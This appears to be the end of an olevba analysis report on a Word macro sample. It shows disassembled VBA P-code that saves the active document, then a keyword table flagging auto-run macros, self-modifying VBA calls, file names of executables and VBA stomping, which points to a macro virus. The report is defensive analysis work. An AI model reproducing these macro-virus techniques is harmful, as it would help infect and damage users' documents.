' 	ArgsMemCall Import 0x0001 
' Line #296:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "A"
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #297:
' 	EndIfBlock 
' Line #298:
' 	Label NoInf 
' Line #299:
' Line #300:
' 	Label eb 
' Line #301:
' 	EndSub 
' Line #302:
' Line #303:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |lo.bat              |Executable file name                         |
|IOC       |losys.exe           |Executable file name                         |
|IOC       |Attrib.exe          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

